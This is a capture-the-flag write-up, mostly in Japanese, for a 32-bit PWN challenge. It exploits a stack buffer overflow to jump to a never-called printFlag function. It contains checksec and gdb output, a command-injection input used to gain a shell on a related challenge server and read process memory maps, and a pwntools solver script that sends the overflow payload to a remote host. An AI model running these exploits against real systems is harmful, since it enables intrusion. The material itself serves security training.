# Never Called:PWN:362pts
I made a C program and in the program the method to get the flag is never called. How will you get it this time?  
ASLR is off on the server.  

[a.out](a.out)  
[213.133.103.186:5548](213.133.103.186:5548)  

# Solution
ファイルと接続先が渡される。  
ひとまずファイルを解析する。  
```bash
$ file a.out
a.out: ELF 32-bit LSB pie executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=d7752ae644fe997e0894f0a66f20ca20745cfdf8, for GNU/Linux 3.2.0, with debug_info, not stripped
$ checksec --file=./a.out
[*] '/a.out'
    Arch:     i386-32-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      PIE enabled
    RWX:      Has RWX segments
$ ./a.out
Starting program
Enter your name: AAAAAAAAAA
Hello, AAAAAAAAAA
back.Exiting!satoki@satoki00:/mnt/c/Users/satok/Downloads/DL$
$ python -c 'print("A"*100, end="")' | ./a.out
Starting program
Enter your name: Hello, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Segmentation fault
```
自明なBOFがあるが、ELF 32-bitであり、PIEが有効のようだ。  
gdbでシンボルを見てみる。  
```bash
$ gdb ./a.out
gdb-peda$ info functions
All defined functions:

File main.c:
18:     void getMessage();
10:     int main(int, char **);
25:     void printFlag();

Non-debugging symbols:
0x00001000  _init
0x00001040  __libc_start_main@plt
0x00001050  printf@plt
0x00001060  gets@plt
0x00001070  fgets@plt
0x00001080  fclose@plt
0x00001090  puts@plt
0x000010a0  exit@plt
0x000010b0  fopen@plt
0x000010c0  __cxa_finalize@plt
0x000010d0  _start
0x00001100  __x86.get_pc_thunk.bx
0x00001110  deregister_tm_clones
0x00001150  register_tm_clones
0x000011a0  __do_global_dtors_aux
0x000011f0  frame_dummy
0x000011f9  __x86.get_pc_thunk.dx
0x00001324  _fini
gdb-peda$ disass printFlag
Dump of assembler code for function printFlag:
   0x000012ab <+0>:     push   ebp
   0x000012ac <+1>:     mov    ebp,esp
   0x000012ae <+3>:     push   ebx
   0x000012af <+4>:     sub    esp,0x414
   0x000012b5 <+10>:    call   0x1100 <__x86.get_pc_thunk.bx>
   0x000012ba <+15>:    add    ebx,0x2d06
   0x000012c0 <+21>:    sub    esp,0x8
   0x000012c3 <+24>:    lea    eax,[ebx-0x1f7b]
   0x000012c9 <+30>:    push   eax
   0x000012ca <+31>:    lea    eax,[ebx-0x1f79]
   0x000012d0 <+37>:    push   eax
   0x000012d1 <+38>:    call   0x10b0 <fopen@plt>
   0x000012d6 <+43>:    add    esp,0x10
   0x000012d9 <+46>:    mov    DWORD PTR [ebp-0xc],eax
   0x000012dc <+49>:    sub    esp,0x4
   0x000012df <+52>:    push   DWORD PTR [ebp-0xc]
   0x000012e2 <+55>:    push   0x400
   0x000012e7 <+60>:    lea    eax,[ebp-0x40c]
   0x000012ed <+66>:    push   eax
   0x000012ee <+67>:    call   0x1070 <fgets@plt>
   0x000012f3 <+72>:    add    esp,0x10
   0x000012f6 <+75>:    sub    esp,0x8
~~~
```
`printFlag`なるものがあるので、これを呼べばよいらしい。  
32-bitなので、末尾を当てるガチャかと思ったが、`gets`や`fgets`でヌルバイト終端でありアドレスが壊れる。  
困っているとチームメンバが[Starting_place](../Starting_place)の構成と同じである可能性と調査手法について教えてくれた。  
以下のようにメタ読みする。  
```bash
$ nc 213.133.103.186 6591
Hi! would you like see the current directory?
ABCDEFGHIJKLsh
ABCDEFGHIJKLsh
Ok

sh: 0: can't access tty; job control turned off
# ps x
ps x
    PID TTY      STAT   TIME COMMAND
      1 ?        Ss     0:00 socat TCP-LISTEN:80,reuseaddr,fork EXEC:"./a.out",p
     13 ?        R      0:00 socat TCP-LISTEN:80,reuseaddr,fork EXEC:"./a.out",p
     14 ?        S      0:00 ./a.out
     15 ?        S      0:00 sh -c sh ?P???l??? ???.
     16 ?        S      0:00 sh
     19 ?        R      0:00 ps x
# cat /proc/14/maps
cat /proc/14/maps
56555000-56556000 r--p 00000000 00:213 19538647                          /a.out
56556000-56557000 r-xp 00001000 00:213 19538647                          /a.out
56557000-56558000 r--p 00002000 00:213 19538647                          /a.out
56558000-56559000 r--p 00002000 00:213 19538647                          /a.out
56559000-5655a000 rw-p 00003000 00:213 19538647                          /a.out
5655a000-5657c000 rw-p 00000000 00:00 0                                  [heap]
f7d8a000-f7daa000 r--p 00000000 00:213 19535558                          /usr/lib32/libc.so.6
f7daa000-f7f28000 r-xp 00020000 00:213 19535558                          /usr/lib32/libc.so.6
f7f28000-f7fad000 r--p 0019e000 00:213 19535558                          /usr/lib32/libc.so.6
f7fad000-f7fae000 ---p 00223000 00:213 19535558                          /usr/lib32/libc.so.6
f7fae000-f7fb0000 r--p 00223000 00:213 19535558                          /usr/lib32/libc.so.6
f7fb0000-f7fb1000 rw-p 00225000 00:213 19535558                          /usr/lib32/libc.so.6
f7fb1000-f7fbb000 rw-p 00000000 00:00 0
f7fbe000-f7fc0000 rw-p 00000000 00:00 0
f7fc0000-f7fc4000 r--p 00000000 00:00 0                                  [vvar]
f7fc4000-f7fc6000 r-xp 00000000 00:00 0                                  [vdso]
f7fc6000-f7fc7000 r--p 00000000 00:213 19535545                          /usr/lib32/ld-linux.so.2
f7fc7000-f7fec000 r-xp 00001000 00:213 19535545                          /usr/lib32/ld-linux.so.2
f7fec000-f7ffb000 r--p 00026000 00:213 19535545                          /usr/lib32/ld-linux.so.2
f7ffb000-f7ffd000 r--p 00034000 00:213 19535545                          /usr/lib32/ld-linux.so.2
f7ffd000-f7ffe000 rw-p 00036000 00:213 19535545                          /usr/lib32/ld-linux.so.2
fffdd000-ffffe000 rwxp 00000000 00:00 0                                  [stack]
```
`0x56555000`より後にマッピングされるようだ。  
以下のsolver.pyで`printFlag`に飛ばす。  
```python
from pwn import *

host = "213.133.103.186"
port = 5548

elf = ELF("a.out")
addr_pFlag = 0x56555000 + elf.symbols["printFlag"]

r = remote(host, port)
r.recvuntil(b"Enter your name: ")
payload = b"A" * 62
payload += p32(addr_pFlag)
r.sendline(payload)
print(r.recvall())
r.close()
```
実行する。  
```bash
$ python solver.py
[*] '/a.out'
    Arch:     i386-32-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      PIE enabled
    RWX:      Has RWX segments
[+] Opening connection to 213.133.103.186 on port 5548: Done
[+] Receiving all data: Done (186B)
[*] Closed connection to 213.133.103.186 port 5548
b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xabbUV\r\nHello, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xabbUV\r\nYour flag: bucket{5t4ck_5m45h3r_974c91a5}\r\n'
```
flagが得られた。  

## bucket{5t4ck_5m45h3r_974c91a5}